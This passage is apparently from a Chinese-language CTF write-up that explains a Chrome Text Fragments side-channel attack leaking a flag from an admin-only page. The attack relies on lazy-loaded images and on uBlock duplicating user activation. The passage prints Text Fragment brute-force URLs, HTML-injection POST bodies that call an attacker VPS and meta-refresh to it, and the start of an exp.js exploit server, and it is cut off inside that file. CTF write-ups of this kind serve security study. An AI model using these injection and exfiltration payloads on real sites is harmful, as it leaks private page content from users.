&#x6CE8;&#x5165;&#x521B;&#x9020;&#x5224;&#x65AD;&#x6761;&#x4EF6;&#xFF1A;&#x6CE8;&#x5165;&#x8DB3;&#x591F;&#x591A;&#x7684;<code>&lt;br&gt;</code>&#x6807;&#x7B7E;&#xFF0C;&#x8BA9; FLAG &#x4F4D;&#x4E8E;&#x7528;&#x6237;&#x89C6;&#x7A97;&#x9875;&#x9762;&#x4E4B;&#x5916;&#xFF0C;&#x5E76;&#x5728;<code>&lt;br&gt;</code>&#x7684;&#x6700;&#x540E;&#x52A0;&#x5165;&#x4E00;&#x4E2A;&#x56FE;&#x7247;&#xFF0C;&#x5229;&#x7528;&#x56FE;&#x7247;&#x61D2;&#x52A0;&#x8F7D;&#x6765;&#x786E;&#x5B9A; Text Fragments &#x662F;&#x5426;&#x5339;&#x914D;&#x5230;&#x4E86; FLAG</li><li>&#x4E00;&#x5F00;&#x59CB;&#x56E0;&#x4E3A;&#x56FE;&#x7247;&#x88AB;&#x653E;&#x7F6E;&#x5230;&#x4E86;&#x7528;&#x6237;&#x89C6;&#x7A97;&#x4E4B;&#x5916;&#x5E76;&#x4E14;&#x7531;&#x4E8E;&#x56FE;&#x7247;&#x61D2;&#x52A0;&#x8F7D;&#xFF0C;&#x56FE;&#x7247;&#x5E76;&#x4E0D;&#x4F1A;&#x8BF7;&#x6C42;&#x5BF9;&#x5E94;&#x7684;&#x8D44;&#x6E90;&#xFF0C;&#x8FD9;&#x65F6;&#x5982;&#x679C;<code>#:~:text=P-,C,T,-F</code>&#x5339;&#x914D;&#x5230;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x6CE8;&#x5165;&#x7684;<code>&lt;br&gt;</code>&#x6807;&#x7B7E;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x9875;&#x9762;&#x4F1A;&#x5148;&#x8FDB;&#x884C;&#x6EDA;&#x52A8;&#x5230; FLAG &#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#xFF0C;&#x56FE;&#x7247;&#x624D;&#x4F1A;&#x52A0;&#x8F7D;&#x5BF9;&#x5E94;&#x7684;&#x8D44;&#x6E90;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x56FE;&#x7247;&#x61D2;&#x52A0;&#x8F7D;&#x6765;&#x786E;&#x5B9A;&#x5339;&#x914D;&#x6210;&#x529F;&#xFF1B;&#x5982;&#x679C;&#x5339;&#x914D;&#x4E0D;&#x6210;&#x529F;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x4E0D;&#x4F1A;&#x8BF7;&#x6C42;&#x5BF9;&#x5E94;&#x7684;&#x8D44;&#x6E90;</li><li>&#x6240;&#x4EE5;&#x8FD9;&#x65F6;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x5229;&#x7528;&#x81EA;&#x5DF1;&#x7684; vps &#x76D1;&#x542C;&#x4E00;&#x4E2A;&#x7AEF;&#x53E3;&#x8BA9;&#x61D2;&#x52A0;&#x8F7D;&#x7684;&#x56FE;&#x7247;&#x5728;&#x89E6;&#x53D1;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x8BF7;&#x6C42;&#x6211;&#x4EEC;&#x7684; vps &#x5C31;&#x53EF;&#x4EE5;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5339;&#x914D;&#x6210;&#x529F;&#x4E86;</li></ul><blockquote class="colorquote info"><p>Note:</p><blockquote><p>Support the &#x2018;loading&#x2019; attribute, which can be used to defer the load of below-the-fold iframes and images on the page until the user scrolls near them. This is to reduce data usage, memory usage, and to speed up above-the-fold content. Web developers can opt-in to lazy load by specifying loading=lazy on <code>&lt;iframe&gt;</code> and <code>&lt;img&gt;</code> elements.</p></blockquote><p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x53EA;&#x6709;&#x5F53;&#x7528;&#x6237;&#x7A97;&#x53E3;&#x9875;&#x9762;&#x5185;&#x5173;&#x6CE8;&#x5230;<code>&lt;img&gt;</code>&#x6807;&#x7B7E;&#x65F6;&#xFF0C;&#x8BE5;&#x6807;&#x7B7E;&#x624D;&#x80FD;&#x52A0;&#x8F7D;&#x5BF9;&#x5E94;&#x7684;&#x8D44;&#x6E90;&#x3002;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>&lt;img&gt;</code>&#x539F;&#x751F;&#x5C5E;&#x6027;<code>loading=lazy</code>&#x6765;&#x5B9E;&#x73B0;&#xFF0C;Chrome 76&#x4EE5;&#x540E;&#x7684;&#x7248;&#x672C;&#x90FD;&#x5DF2;&#x5B9E;&#x73B0;&#x4E86;&#x8BE5;&#x529F;&#x80FD;&#x2014;&#x2014;<a href="https://chromestatus.com/feature/5645767347798016" target="_blank" rel="noopener">Lazily load iframes and images via &#x2018;loading&#x2019; attribute</a></p></blockquote><p>&#x81F3;&#x6B64;&#xFF0C;&#x57FA;&#x672C;&#x4E0A;&#x6BD4;&#x8F83;&#x5173;&#x952E;&#x7684;&#x5730;&#x65B9;&#x6211;&#x4EEC;&#x90FD;&#x8BF4;&#x5B8C;&#x4E86;&#xFF0C;&#x5269;&#x4E0B;&#x7684;&#x5C31;&#x662F;&#x5B9E;&#x73B0;&#x4EE5;&#x53CA;&#x4E00;&#x4E9B;&#x7EC6;&#x8282;&#x7684;&#x5730;&#x65B9;&#x4E86;&#x3002;</p><h3 id="uBlock-amp-User-Activation-amp-Text-Fragments"><a href="#uBlock-amp-User-Activation-amp-Text-Fragments" class="headerlink" title="uBlock &amp; User Activation &amp; Text Fragments"></a>uBlock &amp; User Activation &amp; Text Fragments</h3><p>&#x8FD9;&#x65F6;&#x6211;&#x4EEC;&#x518D;&#x6765;&#x56DE;&#x5934;&#x770B; uBlock &amp; User Activation &#x5728;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x8D77;&#x5230;&#x4E86;&#x4EC0;&#x4E48;&#x4F5C;&#x7528;&#x5462;&#xFF1F;</p><p>&#x56E0;&#x4E3A; Chrome 80 &#x5F15;&#x5165;&#x4E86; Text Fragments &#x7684;&#x673A;&#x5236;&#xFF0C;&#x7EFC;&#x4E0A;&#x6211;&#x4EEC;&#x7684;&#x5206;&#x6790;&#x5229;&#x7528;&#x53EF;&#x4EE5;&#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x653B;&#x51FB;&#x9762;&#xFF0C;&#x7528;&#x8FD9;&#x79CD;&#x201C;&#x4FA7;&#x4FE1;&#x9053;&#x201D;&#x7684;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7A83;&#x53D6;&#x7528;&#x6237;&#x9690;&#x79C1;&#xFF0C;&#x6240;&#x4EE5;&#x5F53;&#x7136;&#x51FA;&#x4E8E;&#x9690;&#x79C1;&#x8003;&#x8651;&#xFF0C; Google &#x4E5F;&#x5F15;&#x5165;&#x4E86;&#x76F8;&#x5BF9;&#x7684;&#x9650;&#x5236;&#x673A;&#x5236;&#xFF1A;</p><blockquote><p>The following subsections restrict the feature to mitigate the expected attack vectors. In summary, the text fragment directives are invoked only on full (non-same-page) navigations that are the result of a user activation. Additionally, navigations originating from a different origin than the destination will require the navigation to take place in a &#x201C;noopener&#x201D; context, such that the destination page is known to be sufficiently isolated.</p></blockquote><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6CE8;&#x610F;&#x5230;&#x5176;&#x4E2D;&#x975E;&#x5E38;&#x5173;&#x952E;&#x7684;&#x4E00;&#x53E5;&#x8BDD;&#xFF1A; <em>*<em>In summary, the text fragment directives are invoked only on full navigations that are the result of a user activation. *</em></em></p><p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4; Text Fragments &#x529F;&#x80FD;&#x4EC5;&#x5728;&#x7531;&#x4E8E; User Activation &#x4EA7;&#x751F;&#x7684;&#x5B8C;&#x6574;&#x5BFC;&#x5411;&#x4E0A;&#x624D;&#x80FD;&#x751F;&#x6548;&#xFF0C;&#x6CA1;&#x6709; User Activation &#x662F;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;&#x8BE5;&#x529F;&#x80FD;&#x7684;&#xFF01;&#x5728;&#x5176;&#x4ED6;&#x5730;&#x65B9;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x5230; Google &#x5BF9;&#x4E8E; *<em>User Activation *</em> &#x505A;&#x4E86;&#x5F88;&#x591A;&#x7684;&#x5F3A;&#x8C03;&#xFF1A;</p><blockquote><p>The examples above illustrate that in specific circumstances, it may be possible for an attacker to extract 1 bit of information about content on the page. However, care must be taken so that such opportunities cannot be exploited to extract arbitrary content from the page by repeating the attack. For this reason, restrictions based on user activation and browsing context isolation are very important and must be implemented.</p></blockquote><p><em><strong>For this reason, restrictions based on user activation and browsing context isolation are very important and must be implemented.</strong></em></p><p>&#x56E0;&#x6B64;&#xFF0C;&#x57FA;&#x4E8E; User Activation &#x548C;&#x6D4F;&#x89C8;&#x4E0A;&#x4E0B;&#x6587;&#x9694;&#x79BB;&#x7684;&#x9650;&#x5236;&#x975E;&#x5E38;&#x91CD;&#x8981;&#xFF0C;&#x5FC5;&#x987B;&#x4E88;&#x4EE5;&#x5B9E;&#x65BD;&#x3002;</p><p>&#x81F3;&#x4E8E; Chrome &#x5982;&#x4F55;&#x5B9E;&#x73B0;&#x9650;&#x5236;&#x8BE5;&#x529F;&#x80FD;&#x7684;&#xFF0C;&#x5177;&#x4F53;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x6587;&#x6863; <a href="https://wicg.github.io/ScrollToTextFragment/#restricting-the-text-fragment" target="_blank" rel="noopener">Restricting the Text Fragment</a> &#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x8BE6;&#x8FF0;&#x4E86;&#x3002;</p><p>&#x4ECE;&#x4EE5;&#x4E0A;&#x6765;&#x770B;&#xFF0C;&#x51FA;&#x9898;&#x4EBA;&#x7684;&#x9898;&#x56FE;&#x5C31;&#x5F88;&#x660E;&#x663E;&#x4E86;&#xFF1A;</p><blockquote><p>Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation.</p></blockquote><p>&#x5E76;&#x4E14;&#x6839;&#x636E; <a href="https://docs.google.com/document/d/1erpl1yqJlc1pH0QvVVmi1s3WzqQLsEXTLLh6VuYp228/" target="_blank" rel="noopener">User Activation v2 in Chrome</a> &#xFF1A;</p><blockquote><p>Full-overlay request from subframes: To grant a subframe&#x2019;s full-overlay request (sent through a postMessage), the main frame will check the subframe&#x2019;s HasConsumableUserActivation bit and will consume it. If we expose the frame states through read-only Boolean properties of HTMLIFrameElement (or Document), the main frame can access the info through the postMessage&#x2019;s <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" target="_blank" rel="noopener">event source</a> parameter.</p></blockquote><p>&#x4E24;&#x8005;&#x7ED3;&#x5408;&#x5728;&#x4E00;&#x8D77;&#x53EF;&#x80FD;&#x5C31;&#x6BD4;&#x8F83;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#x4E86;&#xFF0C;<strong>&#x4EE5;&#x4E0B;&#x662F;&#x4E2A;&#x4EBA;&#x6839;&#x636E;&#x6587;&#x6863;&#x7406;&#x89E3;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x53C2;&#x8003;&#x7814;&#x7A76;&#x5177;&#x4F53;&#x4EE3;&#x7801;&#x5B9E;&#x73B0;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x5E08;&#x5085;&#x6839;&#x636E;&#x4EE3;&#x7801;&#x7814;&#x7A76;&#x51FA;&#x7ED3;&#x679C;&#x4E0E;&#x6211;&#x7684;&#x7406;&#x89E3;&#x6709;&#x4EC0;&#x4E48;&#x51FA;&#x5165;&#xFF0C;&#x90A3;&#x4E00;&#x5B9A;&#x662F;&#x6211;&#x9519;&#x4E86;</strong>&#xFF1A;</p><p>&#x4E2A;&#x4EBA;&#x7406;&#x89E3;&#xFF1A;&#x7BA1;&#x7406;&#x5458;&#x5355;&#x51FB;&#x4E00;&#x4E2A;&#x6211;&#x4EEC;&#x63D0;&#x4EA4;&#x6253;&#x7684;&#x94FE;&#x63A5;&#xFF0C;&#x5C06;&#x6D88;&#x8017;&#x4E00;&#x4E2A;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x6253;&#x5F00;&#x94FE;&#x63A5;&#xFF0C;&#x800C; uBlock &#x5C06; <code>postMessage</code> &#x53D1;&#x9001;&#x5230;&#x5176;&#x6269;&#x5C55; iframe &#xFF0C;&#x4ECE;&#x800C;&#x590D;&#x5236;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x3002; &#x6BCF;&#x5F53;&#x9875;&#x9762;&#x52A0;&#x8F7D;&#x65F6;&#xFF0C;&#x524D;&#x7AEF;&#x90FD;&#x4F1A;&#x4ECE; uBlock &#x6846;&#x67B6;&#x83B7;&#x53D6; postMessage &#xFF0C;&#x4ECE;&#x800C;&#x518D;&#x6B21;&#x5C06;&#x6FC0;&#x6D3B;&#x590D;&#x5236;&#x56DE;&#x53BB;&#x3002;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4ECE; <a href="#Verification">Verification</a> &#x770B;&#x5230;&#x5173;&#x4E8E; uBlock &#x4F20;&#x9012; User Activation &#x7684;&#x9A8C;&#x8BC1;&#x3002;</p><h3 id="Regex"><a href="#Regex" class="headerlink" title="Regex"></a>Regex</h3><p>&#x56E0;&#x4E3A; FLAG &#x6B63;&#x5219;&#x4E3A; <code>/^PCTF\{[A-Z0-9_]+\}$/</code>&#xFF0C;&#x6211;&#x4EEC;&#x6BCF;&#x6B21;&#x7528; Text Fragments &#x53EA;&#x80FD;&#x9A8C;&#x8BC1;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x4F8B;&#x5982;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x5982;&#x4E0B; url &#xFF0C;&#x4E00;&#x6B21;&#x53EF;&#x4EE5;&#x5339;&#x914D;&#x5B8C;&#x5168;&#x90E8;&#x7684;&#x7B26;&#x5408;&#x6B63;&#x5219;&#x7684;&#x5B57;&#x7B26;&#xFF0C;A-Z0-9_ &#x5916;&#x52A0;&#x4E00;&#x4E2A; } &#x4E3A; FLAG &#x95ED;&#x5408;&#x7684;&#x5B57;&#x7B26;</p><p></p><figure class="highlight excel hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ht<span class="hljs-symbol">tp:</span>//catalog.pwni.ng/issue.php?id=<span class="hljs-number">3</span>#<span class="hljs-symbol">:</span>~<span class="hljs-symbol">:te</span>xt=<span class="hljs-built_in">T</span>-,F,{,-}%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">0%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">1%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">2%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">3%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">4%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">5%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">6%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">7%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">8%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">9%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-A%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-B%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-D%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-E%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-F%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-G%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-H%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-I%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-J%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-K%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-L%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-M%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-built_in">N</span>%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-O%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-P%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-Q%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-R%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-S%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-built_in">T</span>%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-U%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-V%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-W%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-X%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-Y%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-Z%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-_</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x679C;&#x5339;&#x914D;&#x4E86;&#xFF0C;&#x5219;&#x53BB;&#x6389;&#x4E00;&#x534A;&#x7684;&#x5B57;&#x7B26;&#xFF0C;&#x91C7;&#x7528;&#x4E8C;&#x5206;&#x7684;&#x5F62;&#x5F0F;&#x7F29;&#x5C0F;&#x6211;&#x4EEC;&#x7684;&#x5339;&#x914D;&#x8303;&#x56F4;&#xFF0C;&#x6240;&#x4EE5;&#x4E0B;&#x4E00;&#x6B21;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x9001;&#x7684;&#x662F;</p><p></p><figure class="highlight excel hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ht<span class="hljs-symbol">tp:</span>//catalog.pwni.ng/issue.php?id=<span class="hljs-number">3</span>#<span class="hljs-symbol">:</span>~<span class="hljs-symbol">:te</span>xt=<span class="hljs-built_in">T</span>-,F,{,-}%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">0%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">1%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">2%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">3%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">4%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">5%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">6%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">7%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">8%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">9%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-A%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-B%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-D%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-E%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-F%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-G%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-H%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-I</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x679C;&#x5339;&#x914D;&#x4E86;&#xFF0C;&#x5C31;&#x7EE7;&#x7EED;&#x5728;&#x8FD9;&#x4E2A;&#x8303;&#x56F4;&#x4E8C;&#x5206;&#xFF0C;&#x4E0D;&#x5339;&#x914D;&#x5C31;&#x7528;&#x53E6;&#x4E00;&#x4E2A;&#x8303;&#x56F4;</p><h3 id="Reproduce"><a href="#Reproduce" class="headerlink" title="Reproduce"></a>Reproduce</h3><p>&#x8FD9;&#x4E2A;&#x90E8;&#x5206;&#x5C31;&#x53EA;&#x662F;&#x63D0;&#x4F9B;&#x590D;&#x73B0;&#x7684;&#x6B65;&#x9AA4;&#xFF0C;&#x4E0B;&#x4E2A;&#x90E8;&#x5206;&#x63D0;&#x4F9B;&#x8BE6;&#x7EC6;&#x7684;&#x653B;&#x51FB;&#x94FE;&#x89E3;&#x91CA;&#xFF1A;</p><ol><li><p>&#x6CE8;&#x518C;&#x4E00;&#x4E2A;&#x8D26;&#x53F7;&#xFF0C;&#x521B;&#x5EFA;&#x4E00;&#x4E2A; issue &#xFF0C;&#x5E76;&#x8BB0;&#x5F55;&#x8BE5; issue &#x7684;&#x6570;&#x5B57; id&#xFF0C;&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x8FA8;&#x8BC6;&#xFF0C;&#x8BE5;&#x6570;&#x5B57; id &#x6211;&#x4EEC;&#x79F0;&#x4E3A; issue_id_1 &#xFF0C;post http &#x5305;&#x7684; body &#x5185;&#x5BB9;&#x4E3A;&#xFF1A;</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">id</span>=issue_id_1&amp;title=3&amp;content=1&amp;image=z&quot;/&gt;&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;http://your_vps/fragment&quot;</span>&gt;&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span>+content=&quot;0;URL=&apos;http://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}%<span class="hljs-attribute">26text</span>=T-,F,{,-0%<span class="hljs-attribute">26text</span>=T-,F,{,-1%<span class="hljs-attribute">26text</span>=T-,F,{,-2%<span class="hljs-attribute">26text</span>=T-,F,{,-3%<span class="hljs-attribute">26text</span>=T-,F,{,-4%<span class="hljs-attribute">26text</span>=T-,F,{,-5%<span class="hljs-attribute">26text</span>=T-,F,{,-6%<span class="hljs-attribute">26text</span>=T-,F,{,-7%<span class="hljs-attribute">26text</span>=T-,F,{,-8%<span class="hljs-attribute">26text</span>=T-,F,{,-9%<span class="hljs-attribute">26text</span>=T-,F,{,-A%<span class="hljs-attribute">26text</span>=T-,F,{,-B%<span class="hljs-attribute">26text</span>=T-,F,{,-D%<span class="hljs-attribute">26text</span>=T-,F,{,-E%<span class="hljs-attribute">26text</span>=T-,F,{,-F%<span class="hljs-attribute">26text</span>=T-,F,{,-G%<span class="hljs-attribute">26text</span>=T-,F,{,-H%<span class="hljs-attribute">26text</span>=T-,F,{,-I%<span class="hljs-attribute">26text</span>=T-,F,{,-J%<span class="hljs-attribute">26text</span>=T-,F,{,-K%<span class="hljs-attribute">26text</span>=T-,F,{,-L%<span class="hljs-attribute">26text</span>=T-,F,{,-M%<span class="hljs-attribute">26text</span>=T-,F,{,-N%<span class="hljs-attribute">26text</span>=T-,F,{,-O%<span class="hljs-attribute">26text</span>=T-,F,{,-P%<span class="hljs-attribute">26text</span>=T-,F,{,-Q%<span class="hljs-attribute">26text</span>=T-,F,{,-R%<span class="hljs-attribute">26text</span>=T-,F,{,-S%<span class="hljs-attribute">26text</span>=T-,F,{,-T%<span class="hljs-attribute">26text</span>=T-,F,{,-U%<span class="hljs-attribute">26text</span>=T-,F,{,-V%<span class="hljs-attribute">26text</span>=T-,F,{,-W%<span class="hljs-attribute">26text</span>=T-,F,{,-X%<span class="hljs-attribute">26text</span>=T-,F,{,-Y%<span class="hljs-attribute">26text</span>=T-,F,{,-Z%<span class="hljs-attribute">26text</span>=T-,F,{,-_<span class="hljs-string">&apos;&quot;&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>&#x518D;&#x521B;&#x5EFA;&#x4E00;&#x4E2A; issue &#xFF0C; &#x5E76;&#x8BB0;&#x5F55;&#x8BE5; issue &#x7684;&#x6570;&#x5B57; id&#xFF0C;&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x8FA8;&#x8BC6;&#xFF0C;&#x8BE5;&#x6570;&#x5B57; id &#x6211;&#x4EEC;&#x79F0;&#x4E3A; issue_id_2&#xFF0C;post http &#x5305;&#x7684; body &#x5185;&#x5BB9;&#x4E3A;&#xFF1A;</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">id</span>=issue_id_2&amp;title=3&amp;content=1&amp;image=&quot;&gt;&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;0;URL=&apos;http://your_vps/&apos;&quot;</span>&gt;&quot;</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>&#x81EA;&#x5DF1;&#x7684; vps &#x4E0A;&#x7528; node &#x8FD0;&#x884C;&#x5982;&#x4E0B; exp.js</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> status = <span class="hljs-literal">false</span>;</span><br><span class="line"><span class="hljs-keyword">let</span> unlock = <span class="hljs-literal">false</span>;</span><br><span class="line"><span 